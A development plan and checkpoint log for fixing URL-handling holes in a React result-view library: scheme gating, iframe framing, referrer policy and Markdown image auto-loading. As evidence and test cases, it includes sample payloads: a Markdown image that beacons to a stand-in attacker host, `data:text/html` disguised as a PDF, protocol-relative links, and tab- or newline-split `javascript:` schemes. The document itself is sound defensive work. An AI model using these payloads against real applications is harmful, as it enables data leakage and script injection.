---
status: active
item: L-260905-221cd4
---

# The result view's URL policy — plan

**Written 2026-09-06, from a verification of the bug against source on `dev` at 8446a47** (the 0.8.0 release plus the unreleased `./generative` entry). It fixes `L-260905-221cd4`, filed from the starter template's review of its own result-view PR. The kickoff gesture is on the item: `cd _mthds-form--result-url-policy && ledger claim L-260905-221cd4 --renew`.

The whole fix is one pull request against `dev`. The phases below are the order to do it in, not separate landings, and the two checkpoints are where a session can hand off without losing the thread.

## The bug, confirmed against source

Every claim in the item was made against the shipped `dist` of 0.8.0. All of them hold in the source, and none has moved since the release.

| Claim | Where it is in source | Verdict |
| --- | --- | --- |
| The gate accepts any `data:` media type, `http:`, `blob:` and a root-relative path | `src/core/native-content.ts:302-306` — `isViewableUrl` is a prefix regex over the raw string | Confirmed. `data:text/html,…` passes. |
| The document preview frames the URL with no `sandbox` | `src/react/result-field.tsx:520-531` — `DocumentPreview` sets `src`, `title`, `loading` and `referrerPolicy`, nothing else | Confirmed. `HtmlPreview` (`src/react/html-preview.tsx:216`) sandboxes and carries a CSP, so this is a gap and not a posture. |
| Previewability is decided from the payload's own `mime_type` or `filename`, never from the URL | `src/react/result-field.tsx:500-508` — `previewableUrl` tests `content.mimeType`, falling back to `content.filename ?? url` | Confirmed. `{url: "data:text/html,…", filename: "report.pdf"}` is offered a preview and framed. |
| The link and download sinks act on the same verdict with no scheme check of their own | `FileRef` at `src/react/result-field.tsx:435-445` and `ImageValue` at `:611-618` wrap the URL in `<a target="_blank">`; `downloadStuff` at `src/react/download-stuff.ts:101-114` fetches `resolveUrl(url) ?? publicUrl ?? url` and falls back to `window.open` | Confirmed. The download path never consults the gate at all. |
| The scheme test runs on the raw string while every parser upstream strips | `src/react/result-field.tsx:477-485` — `paintableUrl` hands each candidate to the regex untrimmed | Confirmed empirically: `new URL(" https://cdn/x.png").href` is `https://cdn/x.png`, `/^https?:/i.test(" https://cdn/x.png")` is `false`. A host that validated `public_url` by parsing sees the kernel skip it and paint `url`, which nothing validated. |
| A `prose` value's Markdown auto-loads remote images and links protocol-relative hrefs | `src/react/markdown.tsx:297-302` renders `<img src>` for any `safeHref` result with no `referrerPolicy`; `safeHref` at `:309-316` accepts `https?:`, `mailto:` and anything starting with `#` or `/`, so `//attacker/x` passes as a path | Confirmed. `![](https://attacker/collect?…)` in a model's own answer fetches on paint. |

What is not a problem, so the fix does not touch it: the `native.Html` frame (`HtmlPreview`) is already sandboxed with a CSP; text reaches the DOM only as a text child; a `javascript:` link in prose is already dropped.

## What the fix is not

- **Not a host allow-list.** Which origins a host trusts is the host's policy. The kernel's job is to hand a sink only a URL whose scheme and media type cannot execute, and to hand it exactly the string it judged.
- **Not a refusal of cleartext `http:`.** A host developing against a local runner paints `http://localhost:…` URLs, and mixed-content blocking is the browser's own policy on an HTTPS page. The starter template's stopgap refuses `http:` as its own choice; the kernel does not decide that for every host.
- **Not a sanitizer, and not a schema read.** No dependency is added, and nothing here inspects a payload to work out what kind it is (rule 1 in `CLAUDE.md`). The gate judges a URL string; which member is a URL is still the descriptor's statement.

## Design decisions

**D1. One predicate, parsed rather than prefix-matched, with a `data:` allow-list.** `isViewableUrl` stays the one answer the input control and the result view share, and its semantics tighten in three ways. It strips what the WHATWG URL parser strips (leading and trailing C0 controls and spaces, every internal tab, LF and CR), then parses the result against a sentinel origin and branches on `protocol`: `http:` and `https:` are viewable; `blob:` is viewable (a blob URL is bound to the origin that minted it, so a payload cannot forge one that points anywhere else); `data:` is viewable only when its media type is in a fixed allow-list — the raster image types the preview already names (`image/png`, `image/jpeg`, `image/gif`, `image/webp`, `image/avif`) plus `application/pdf`; everything else, `javascript:` and `file:` and `pipelex-storage:` and `data:text/html` and `data:image/svg+xml` included, is not. A root-relative path is viewable only when the parse against the sentinel stays on the sentinel's origin, which is what rejects `//host/x` and the `\\host\x` spelling the parser also reads as protocol-relative, in one rule instead of a regex per spelling. `application/pdf` is in the `data:` allow-list because the input control (`src/react/file-field.tsx:224-236`) already previews a `data:application/pdf` value a storage-less host wrote back through `<object>`, and it reads the same predicate at `:239` and `:273`; `image/svg+xml` is out because an SVG paints as a picture and executes as a document once opened in a tab.

**D2. The string judged is the string used.** A new core function, `viewableUrl(candidate): string | undefined`, returns the normalised string when the gate accepts it and `undefined` otherwise; `isViewableUrl` becomes the type guard over it. `paintableUrl` and every sink take what `viewableUrl` returns rather than the raw member, so the kernel and a host that validated the same member by parsing can no longer disagree about which URL is in play. Both functions are exported from `src/core/index.ts`; a host that wants to pre-judge a payload gets the kernel's own answer rather than a restatement of it, which is what the starter's stopgap had to write by hand.

**D3. A frame takes `http:` and `https:` only, and it is sandboxed.** `previewableUrl` keeps reading the declared type to decide whether a preview is worth offering — that is a usability question and the payload is the right source for it — but it now offers one only over a `frameableUrl`, a stricter arm that admits the two network schemes and nothing else. A `data:` URL is never framed; a raster one is painted as an image by the image arm, and a run never returns an inline PDF. `DocumentPreview` gains a `sandbox` attribute. The token set is decided by Phase 2's browser check, not here: the goal is the smallest set under which current Chrome, Firefox and Safari still render a PDF in the frame, starting from the empty set and adding `allow-same-origin` only if a browser needs it, and never `allow-scripts`. Whatever is chosen is written into the component's comment and into `docs/result-view.md` with the reason. `referrerPolicy="no-referrer"` stays.

**D4. Every `<img>` and every frame this package paints carries `referrerPolicy="no-referrer"`.** Today only the document frame does. The image arm's `LoadingImage` (`src/react/result-field.tsx:791`), the input control's preview (`src/react/file-field.tsx:415`) and the Markdown image gain it. A result view has no business telling a third party where it was opened from, and the frame already says so.

**D5. Prose does not auto-load a remote image; a host opts in.** The Markdown renderer's `image` token renders, by default, as a link carrying the alt text (or the URL when there is none) that opens the image in a new tab — the same shape a refused-scheme link already takes, so nothing the model wrote is lost and a click is the reader's consent. A host that wants pictures painted inline states it once: `ResultEnvProvider` gains `proseImages?: 'link' | 'load'`, defaulting to `'link'`, and the `Markdown` component takes the same prop for a host using it directly. Only `http:` and `https:` are ever painted or linked; a `data:` image in prose is refused outright, because a model's answer is not where an inline image arrives. `safeHref` rejects a protocol-relative href: the path arm becomes "starts with `/` or `#` and, parsed against the sentinel, stays on it", the same rule as D1. Links keep their present policy (`http:`, `https:`, `mailto:`, same-origin paths) — a link needs a click, and gating link hosts is a host allow-list, which is out of scope by design.

**D6. The download path judges the URL before it acts.** `downloadStuff` passes each candidate through `viewableUrl`; a file whose reference nothing accepts is skipped, with the JSON receipt still written beside it. `window.open` is only ever handed an accepted, normalised string.

**D7. A behaviour change on the wire is a release-noted change.** Nothing here moves what goes over the wire — the payload is read, never rewritten — but the rendered result changes for three inputs a consumer might have relied on: a `data:` URL of a type outside the allow-list no longer paints, a remote image in prose no longer auto-loads, and a document preview is now sandboxed. All three go under `## [Unreleased]` in `CHANGELOG.md` as a `### Security` heading, in plain words, with the `proseImages` opt-in named.

## Phases

### Phase 1 — the gate, in core

Files: `src/core/native-content.ts`, `src/core/index.ts`, `src/core/__tests__/native-content.test.ts`.

- Add `viewableUrl` and rewrite `isViewableUrl` over it per D1 and D2, keeping the existing doc comment's two stories (the root-relative resolver path that was once rejected, the protocol-relative exclusion) and adding the third: why the string is normalised before it is judged.
- Export both from the core index. Nothing about JSON Schema is touched; this module reads content models, not schemas.
- Tests, in the node project: whitespace around and inside a URL is normalised and the normalised string is what comes back; `data:` with each allow-listed type passes and `data:text/html`, `data:image/svg+xml`, `data:application/octet-stream` fail; `javascript:`, `file:`, `pipelex-storage:` fail; `//host`, `\\host`, `/\host` fail while `/api/assets/x` passes; scheme matching is case-insensitive (`HTTPS:`); `blob:` passes; an empty string and `undefined` fail.

### Phase 2 — the sinks, in the control set

Files: `src/react/result-field.tsx`, `src/react/download-stuff.ts`, `src/react/file-field.tsx`, `src/react/__tests__/result-field.test.tsx`, a new `src/react/__tests__/download-stuff.test.ts`.

- `paintableUrl` returns `viewableUrl(...)` of the first candidate the gate accepts, in the same durability order. `FileRef` and `ImageValue` receive that string. `ImageGallery`'s "anything paintable" check reads the same function.
- `previewableUrl` offers a preview only over `frameableUrl` (D3). `DocumentPreview` gains `sandbox`.
- `LoadingImage` and the input control's `<img>` gain `referrerPolicy="no-referrer"` (D4).
- `downloadStuff` judges before it fetches or opens (D6).
- **The browser check that decides the sandbox tokens.** Run the Storybook, open the outputs preview story "A PDF → previewable", and click Preview in current Chrome, Firefox and Safari with `sandbox=""` first. A browser that shows a blank frame or a plugin refusal gets `allow-same-origin` tried next. Record the result in the `DocumentPreview` comment and in the docs; never grant `allow-scripts`. The stories project cannot assert what a cross-origin frame painted, so this stays a hand check and the plan says so.
- Tests, in the jsdom project: a `document` value carrying `data:text/html,…` under `filename: "report.pdf"` and `mime_type: "application/pdf"` renders no preview button and no frame, and its reference is named rather than linked; a `document` over an `https:` PDF renders a frame carrying `sandbox` and `referrerPolicy="no-referrer"`; an `image` whose `public_url` is `" https://cdn/x.png"` beside a different `url` paints `https://cdn/x.png` (the trimmed, validated member, not the other one); every `<img>` in a rendered result carries `referrerPolicy`; `downloadStuff` given a `javascript:` `public_url` neither fetches nor opens (stub `fetch` and `window.open`) and still writes the JSON receipt.
- Run `make check` and `make test`. **Checkpoint 1** — record here which sandbox tokens the browser check settled on and why, and anything the tests forced back into the design.

#### Checkpoint 1, 2026-09-06 — the browser check overturned D3's sandbox

**The frame gets no `sandbox` attribute, and the reason is a platform constraint rather than a preference.** D3 assumed there was a smallest token set under which a PDF still renders, and asked the check to find it. There is none: the `sandbox` attribute sets the HTML specification's *sandboxed plugins browsing context flag* unconditionally, and no token unsets it — `allow-plugins` was never adopted. Chrome's PDF viewer is plugin content, so a sandboxed frame cannot display a PDF at all.

Measured headless, framing a same-origin PDF, one cell per token set, on **Chrome 152.0.7977.76** and **Firefox 155.0** (probe page and screenshots were scratch, not committed):

| `sandbox` | Chrome 152 | Firefox 155 |
| --- | --- | --- |
| attribute absent | renders — the control that proves the probe works | renders |
| `""` | broken-document icon | viewer chrome, blank page |
| `allow-same-origin` | broken-document icon | viewer chrome, blank page |
| `allow-scripts` | broken-document icon | **renders** |
| `allow-same-origin allow-scripts` | broken-document icon | **renders** |
| `allow-downloads` | broken-document icon | viewer chrome, blank page |

**The two browsers fail for different reasons and the intersection is empty.** In Chrome even the maximal set fails, which is what identifies the cause as the plugins flag rather than a missing capability. Firefox's pdf.js is not plugin content — it is a JavaScript viewer, so it renders exactly when `allow-scripts` is granted, and its toolbar painting over a blank page in the other cells is the viewer loading and then having no way to run. So the only column that renders in both is *no `sandbox` attribute at all*.

That second result is the sharper one, because it holds even if Chrome's behaviour changes: the token Firefox requires is `allow-scripts`, which is the one token D3 said never to grant, and granting it to a frame would be strictly worse than leaving the attribute off — a sandbox whose only enabled capability is script execution. **Adding a sandbox would not harden the preview; it would delete it** in Chrome, and in Firefox it would either delete it or buy nothing at the price of the one token that matters.

An image document in the same frames renders identically with and without `sandbox` in Firefox, so nothing about the image arm depends on this.

So the fix for the framing hole is entirely D3's *first* half, and it is sufficient: `frameableUrl` admits `http:`, `https:` and a same-origin path, and nothing else. What made the reported bug exploitable was that a `data:` document does not get an origin of its own — it inherits the embedder's — so the "a frame is a separate origin by construction" argument the old comment made was sound for the URLs it had in mind and vacuous for the one that arrived. Restricting the scheme restores the premise instead of compensating for its absence.

**The limit of this check, stated rather than papered over.** Chrome and Firefox were measured; **Safari was not**. It has no headless screenshot mode, `safaridriver` needs `safaridriver --enable` (an admin gesture nobody was asked for), and `screencapture` has no screen-recording permission on this machine, so headful inspection was impossible. Safari's answer cannot change the decision in any case: the intersection of token sets that render is already empty, and a third browser can only shrink it. The claim written into `DocumentPreview`'s comment and the docs is scoped to the two browsers actually measured.

*(The Firefox half failed on the first attempts for an environment reason worth naming, so nobody repeats the dead end: three stuck `org.mozilla.updater` processes were hijacking every launch to apply a staged update, so Firefox never reached the page and `--screenshot` produced nothing. Killing them and running against a throwaway profile with the update prefs off — `app.update.disabledForTesting`, `app.update.auto`, `app.update.enabled`, `app.update.staging.enabled` — made it work first try. It was never a missing capability.)*

**Two things the implementation added beyond the phase's list.**

- `frameableUrl` admits a **root-relative path** as well as the two network schemes. D3 said "the two network schemes and nothing else", but a same-origin path is the resolver case (`/api/assets/…`) the preview exists to serve, and it is the embedding page's own scheme by construction — excluding it would have regressed the very path the root-relative arm was added for. `data:` and `blob:` are excluded, which is what D3 was actually protecting against.
- The **generative entry's brand logos** (`src/generative/product-registry.tsx`) took `referrerPolicy="no-referrer"` too. D4 says every `<img>` this package paints, and these are painted by this package; their scheme was already checked at the manifest boundary, so this is the referrer half only.

**What the tests forced back:** nothing in the design. The one adjustment was to an assertion — a refused `data:` document renders its name in two places (the document's title line and the reference below it), so the test counts rather than demanding one.

### Phase 3 — prose

Files: `src/react/markdown.tsx`, `src/react/result-env.tsx`, `src/react/result-field.tsx` (the prose arm reads the option), `src/react/index.ts` (the type), `src/react/__tests__/markdown.test.tsx`, `src/react/__tests__/result-panel.test.tsx` or `result-field.test.tsx` for the provider path.

- `safeHref` per D5: the path arm parses against the sentinel and requires the sentinel's origin, so `//host` and `\\host` fall out of it; the scheme arm stays.
- The `image` token renders as a link by default and as an `<img referrerPolicy="no-referrer">` under `proseImages: 'load'`; only `http:` and `https:` are ever used for either.
- `ResultEnvProvider` carries `proseImages`, a `useProseImages()` hook reads it, and `Markdown` takes the same prop with the provider's value as its default. `StuffViewer` needs no change: it renders inside the provider a host mounts.
- Tests: `![alt](https://attacker/collect)` renders no `<img>` by default and a link with the alt text; the same under `'load'` renders an `<img>` with `referrerPolicy`; `![](data:image/png;base64,…)` renders neither; `[x](//attacker/x)` renders the text with no anchor; `[x](/docs)` and `[x](#top)` still render anchors; the provider's option reaches a `prose` field rendered through `ResultField`.

### Phase 4 — docs and changelog

Files: `docs/result-view.md`, `docs/upload-seam.md`, `docs/architecture.md`, `README.md` if it lists `ResultEnvProvider`'s props, `CHANGELOG.md`.

- `docs/result-view.md` gains a section, **The URL policy**, stating D1 through D6 in the document's own voice: what the gate accepts and why each arm is there, that the judged string is the used string, what may be framed and under which sandbox, what prose does with an image and how a host opts in. The existing "A framed URL is not the `native.Html` question" paragraph is rewritten rather than left beside the new one, because its claim that the frame needs no sandbox is what this bug disproved: the browser's origin boundary holds for an `https:` document and did not hold for a `data:` one, which is a document at the page's own origin.
- `docs/upload-seam.md`'s resolver contract gains one sentence: what a resolver returns is judged by the same gate as any payload member, so a resolver that answers with a scheme the gate refuses gets the file named rather than painted.
- `docs/architecture.md`'s `native-content` row names `viewableUrl` beside `isViewableUrl`.
- `CHANGELOG.md`, under `## [Unreleased]`, a `### Security` entry per D7. It names `proseImages` and says in one sentence what a consumer that inlined a `data:` value of another type will see.
- Run `make all` (the build and `make assert-bundle` included, since `result-env.tsx` and `markdown.tsx` are in a shipped chunk). **Checkpoint 2** — the PR is open against `dev` with `Closes L-260905-221cd4` in its body; record the PR number here and anything a reviewer sent back that changed a decision above.

#### Checkpoint 2, 2026-09-06 — the PR is open

**PR #22**, against `dev`, carrying `Closes L-260905-221cd4`. `make check`, `make test` and `make all` (build plus `make assert-bundle`) all pass; the entry boundaries and both `'use client'` directives are intact, and the core barrel is still a pure re-export, so a consumer can still tree-shake ajv out of it.

Two things landed beyond the phase lists, both flagged where they happened.

- **`src/__stories__/outputs/preview.stories.tsx` carried a stale claim** and was corrected in the same change. Its comment said a root-relative path is not what `isViewableUrl` accepts — untrue since the resolver arm was added, so it was already wrong on `dev` rather than made wrong here. The absolute URL it builds is kept, for the reason that is actually true: what the story shows is the shape a payload carries, and the standard says a `native.Document`'s `url` is a storage URI, an HTTP(S) URL or a base64 data URL.
- **`docs/upload-seam.md` gained more than the one sentence D-planned.** Beyond "a resolver's answer is judged by the same gate", it now states the two consequences a resolver author needs: return the URL you mean to be used, since the gate hands the sinks its own normalised string; and a resolved root-relative URL is FRAMED at the host's own origin, so stored objects must be served with their real content type or `Content-Disposition: attachment`. That second one is the residual risk left by dropping the sandbox, and the host is the only party that can close it.

The obfuscation cases the parse-first design closes for free — `java\tscript:` and `jav\nascript:`, which a browser strips into `javascript:` and runs while a prefix test sees nothing — are pinned in the core suite and named in `docs/result-view.md`. They were not in the plan because the plan did not anticipate that normalising first would settle them structurally.

#### Checkpoint 3, 2026-09-06 — the pre-landing review, and what it changed

A pre-landing review of PR #22 (structured pass, six specialists, plus adversarial passes from a Claude subagent and from Codex) found six things, each reproduced by running it rather than by reading. Four were regressions this branch introduced against its own stated contract; one was a hole the branch's rationale claimed to have closed and had not.

**The rationale was sound and one arm did not satisfy it.** `frameableUrl` admitted a root-relative path from anywhere, and `PREVIEWABLE_MIME_RE` matches every `image/` subtype — SVG included. So `{url: "/api/assets/x.svg", mime_type: "image/svg+xml"}`, a plain payload member with no resolver in play, rendered `<iframe src="/api/assets/x.svg" sandbox=null>`: a document with a DOM on the host's origin, which is the same shape as the `data:text/html` hole and reached by the `data:` SVG ban's own reasoning being paid around one function later. The path arm is pre-existing on `dev`; what this branch added was the argument that made it look settled, and `docs/upload-seam.md` addressing the mitigation to resolver authors, where a reader will not look for a payload risk.

The fix is **provenance**, not a narrower scheme set. `paintable` asks the resolver first, so it already knows whose answer it is holding; it now says so, and `frameableUrl` admits a path only when `fromResolver`. A payload member must be `http:` or `https:`. A host resolving onto its own origin keeps the `/api/assets/…` preview the arm exists for, and that entitlement is the residual risk the seam contract names.

**Four regressions, each contradicting a comment, the changelog or the docs.**

- **A linked markdown image opened an anchor inside an anchor.** `[![alt](img)](href)` is a link token holding an image token, so the new link-by-default arm rendered `<a>` inside `<a>`. React says so itself ("This will cause a hydration error"); `renderToString` output un-nests into siblings, so every SSR host mismatches on hydration and the visible link points at the image. `ProseImage` now reads an `InsideLinkContext` and renders its text there. The `'load'` arm needed nothing — an `<img>` nests in an anchor perfectly well.
- **The gate resolved a scheme-relative spelling onto the sentinel.** `hasOwnScheme` parsed with no base while the kept parse used the sentinel, so `https:cdn.example/x.png` — a legal URL a browser resolves against the page — came back as `https://url-gate.invalid/cdn.example/x.png`, handed to a real `<img src>`. Whether a candidate has a scheme is now read off the string by RFC 3986's grammar, before any base; an absolute candidate is parsed standalone. The same defect made `//url-gate.invalid/x` pass the protocol-relative rejection, because "did it stay on the sentinel" is blind to the sentinel's own host — so protocol-relative is now refused on the spelling, with the origin check behind it.
- **A bare file the gate refused downloaded nothing at all.** `continue` skipped it and `if (isBareFile) return` then skipped the receipt: no bytes, no JSON, no error, and a promise that resolved clean. The comment above it, `CHANGELOG.md` and `docs/result-view.md` all promised the receipt. The bare-file rule now turns on the file having actually been delivered. It shipped because the receipt test only covered a surrounding object.
- **The input control kept the pattern the branch removed everywhere else,** and tightening the shared predicate changed its meaning underneath it: a `data:` type outside the allow-list stopped being directly viewable, so it was treated as a STORAGE URI and handed to `resolveUrl` — which can never resolve inline bytes — leaving the spinner that the file's own comment says was fixed. It now reads `viewableUrl` as a value, judges what the resolver answers (which is what makes the seam contract's sentence true), keys what reaches the resolver on the value being a reference, and renders a "cannot be shown" state where a spinner would claim a load that was never going to finish.

**One measured performance regression.** `stripUrlWhitespace` rebuilt every string character by character, and the strings that have nothing to strip are the huge ones: an inline `data:` image is judged three or four times per render. Measured on this machine, four gate calls over a 2 MiB `data:` URL cost 222 ms of frozen main thread; Codex independently measured ~813 ms at 4.2 MB with ~500 MiB of heap growth. It now scans first and rebuilds only from the first character that has to go — the same four calls cost 25.7 ms, and an untouched string is returned by identity. Equivalence was fuzzed at 400k random inputs plus every byte value in six positions before the change was made, since this is the function the whole gate rests on. `ImageValue` also asked the gate twice per painted image for one answer; the second call is gone.

Tests were added for each: the sentinel cases in the core suite, the resolver-provenance and `blob:` frame refusals in `result-field.test.tsx`, the nested-anchor cases in `markdown.test.tsx`, the bare-file receipt in `download-stuff.test.ts`, the input-control gate and refusal state in `file-field.test.tsx`, and the brand logos' `referrerPolicy` in the generative suite. `make check`, `make test` and `make all` including `make assert-bundle` all pass.

### Phase 5 — landing and the follow-up elsewhere

- `/ledger-land` after the merge closes the item and flips this plan to `landed`.
- The fix reaches consumers with the next npm release of `@pipelex/mthds-form`. The starter template carries an interim `scrubResultUrls` stopgap written against the 0.8.0 gate; a ledger item owned by that repo, blocked by this one, tracks deleting it once the release carrying this fix is on npm. It may keep an `https:`-only rule as its own policy if it wants one, but the reason the stopgap exists is gone.

## Deliberately out of scope

- **Gating link hosts in prose.** A link needs a click; which hosts to trust is the host's list, and a kernel option for it would be an allow-list API nobody has asked for. Recorded here so the item's "ideally" is answered rather than forgotten.
- **`ImageGallery`'s paintability check ignoring the resolver.** `src/react/result-field.tsx:1320-1323` decides whether to lay out a grid from `publicUrl` and `url` alone, so a resolver-only host with storage references gets rows instead of tiles. Pre-existing and unrelated to trust; worth its own small item if it bites.
- **A CSP on the framed document.** A `src` frame cannot be given a `Content-Security-Policy` by its embedder; the sandbox is the tool the platform offers, and it is what D3 uses.

## Facts verified at kickoff

- `mthds-form` is at 0.8.0 on `dev` (8446a47), with the `./generative` entry under `## [Unreleased]`. This fix lands on `dev` and rides whatever release is cut next.
- The input control reads the shared predicate at `src/react/file-field.tsx:56` under its own name `isDirectlyViewable`, and previews `data:application/pdf` through `<object>` — the reason `application/pdf` is in D1's allow-list.
- The leading-space disagreement reproduces in Node:

  ```
  $ node -e 'console.log(new URL(" https://cdn/x.png").href, /^https?:/i.test(" https://cdn/x.png"))'
  https://cdn/x.png false
  ```

- `HtmlPreview` (`src/react/html-preview.tsx:118` and `:216`) is the in-repo model for a sandboxed frame: `sandbox="allow-same-origin"` with no scripts, and a CSP meta of `default-src 'none'` with an `img-src` the host can set. D3 follows its token discipline; the CSP half does not transfer to a `src` frame.
- The starter template's stopgap (`src/lib/resultUrls.ts` on its result-view branch) restates the 0.8.0 gate verbatim to know which strings the kernel would act on, refuses `http:` and any `data:` outside PNG, JPEG and WebP, and trims an accepted URL so both sides judge the same string. D2's normalisation and D1's allow-list are the kernel-side answers to the two problems it was written around.
